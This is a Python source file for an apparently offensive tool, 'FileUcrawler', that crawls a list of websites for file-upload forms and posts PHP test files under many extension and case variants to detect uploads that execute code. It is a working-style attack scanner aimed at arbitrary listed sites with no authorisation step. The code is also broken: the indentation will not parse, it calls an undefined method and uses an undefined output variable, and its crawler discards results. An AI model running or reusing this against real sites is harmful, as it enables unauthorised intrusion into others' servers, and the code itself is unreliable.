import requests
from bs4 import BeautifulSoup
import sys
from concurrent.futures import ThreadPoolExecutor

class FileUploadFinder:
    def __init__(self, url):
        self.url = url
        self.base_url = url
        self.file_upload_pages = set()
        self.visited = set()

    def find_file_upload(self):
        if self.url not in self.visited:
            self.visited.add(self.url)

            try:
                response = requests.get(self.url)
                if response.status_code == 200:
                    soup = BeautifulSoup(response.content, 'html.parser')
                    forms = soup.find_all('form')

                    for form in forms:
                        if form.find('input', {'type': 'file'}):
                            self.file_upload_pages.add(self.url)
                            break

                    links = soup.find_all('a', href=True)
                    for link in links:
                        href = requests.compat.urljoin(self.base_url, link['href'])
                        if href.startswith(self.base_url):
                            finder = FileUploadFinder(href)
                            finder.find_file_upload()
            except Exception as e:
                print(f"Error crawling {self.url}: {str(e)}")

class FileUploadTester:
    def __init__(self, url):
        self.url = url

    def test_file_upload(self, form_action):
        files_to_test = {
            'php_shell.php': '<?php echo "Shell"; ?>',
            'php_shell.phtml': '<?php echo "Shell"; ?>',
            'php_shell.php3': '<?php echo "Shell"; ?>',
            'php_shell.php4': '<?php echo "Shell"; ?>',
            'php_shell.php5': '<?php echo "Shell"; ?>',
            'php_shell.php6': '<?php echo "Shell"; ?>',
            'php_shell.pht': '<?php echo "Shell"; ?>',
            'php_shell.pHp': '<?php echo "Shell"; ?>',
            'php_shell.PhP': '<?php echo "Shell"; ?>',
        }

        for filename, content in files_to_test.items():
            boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW'
            data = (
                f'--{boundary}\r\n'
                f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'
                f'Content-Type: application/octet-stream\r\n\r\n'
                f'{content}\r\n'
                f'--{boundary}--\r\n'
            ).encode('utf-8')

            headers = {
                'Content-Type': f'multipart/form-data; boundary={boundary}'
            }

            try:
                response = requests.post(form_action, data=data, headers=headers)
                if "Shell" in response.text:
                    print(f"\033[91mVulnerability found on {self.url}\033[0m")
                    return True
            except Exception as e:
                print(f"Error testing {form_action}: {str(e)}")

        return False

def print_banner():
    banner = """
███████╗██╗██╗     ███████╗██╗   ██╗ ██████╗██████╗  █████╗ ██╗    ██╗██╗     
██╔════╝██║██║     ██╔════╝██║   ██║██╔════╝██╔══██╗██╔══██╗██║    ██║██║     
█████╗  ██║██║     █████╗  ██║   ██║██║     ██████╔╝███████║██║ █╗ ██║██║     
██╔══╝  ██║██║     ██╔══╝  ██║   ██║██║     ██╔══██╗██╔══██║██║███╗██║██║     
██║     ██║███████╗███████╗╚██████╔╝╚██████╗██║  ██║██║  ██║╚███╔███╔╝███████╗
╚═╝     ╚═╝╚══════╝╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚══╝╚══╝ ╚══════╝
                                                                              
  \033[92mTool by Miftaul Amin\033[0m
"""
    print(banner)

if __name__ == "__main__":
    print_banner()

    if len(sys.argv) != 3:
        print("Usage: python FileUcrawler.py -l <websitelist.txt>")
        sys.exit(1)

    if sys.argv[1] != '-l':
        print("Error: Invalid flag. Please use -l <websitelist.txt>")
        sys.exit

    try:
        with open(sys.argv[2], 'r') as f:
            urls = [line.strip() for line in f.readlines()]

        found_urls = []
        vulnerable_urls = []

            with ThreadPoolExecutor(max_workers=5) as executor:
        futures = []
        for url in urls:
            if not url.startswith(("http://", "https://")):
                url = "https://" + url
            print(f"\n\033[94mChecking website: {url}\033[0m")
            crawler = FileUploadFinder(url)
            futures.append(executor.submit(crawler.find_file_upload))

        for future in futures:
            future.result()

    for url in urls:
        if not url.startswith(("http://", "https://")):
            url = "https://" + url
        print(f"\n\033[94mChecking website: {url}\033[0m")
        crawler = FileUploadFinder(url)
        crawler.scan_known_upload_paths()

        file_upload_pages = crawler.file_upload_pages
        if file_upload_pages:
            found_urls.append(url)
            print(f"\033[93mFile upload found at the following pages for {url}:\033[0m")
            for page in file_upload_pages:
                print(f"  - {page}")
                tester = FileUploadTester(page)
                if tester.test_file_upload(page):
                    vulnerable_urls.append(url)
        else:
            print(f"No file upload form found at {url}\n")

    if output_file:
        with open(output_file, 'w') as f:
            f.write("Websites with file uploading found:\n")
            for url in found_urls:
                f.write(f"{url}\n")
            f.write("\nWebsites with potential vulnerabilities found:\n")
            for url in vulnerable_urls:
                f.write(f"{url}\n")

    print("\n\033[92m**FileUcrawler** by Miftaul Amin\033[0m")
    print("Status: Completed")
except FileNotFoundError:
    print("Error: The file specified does not exist.")
    sys.exit(1)

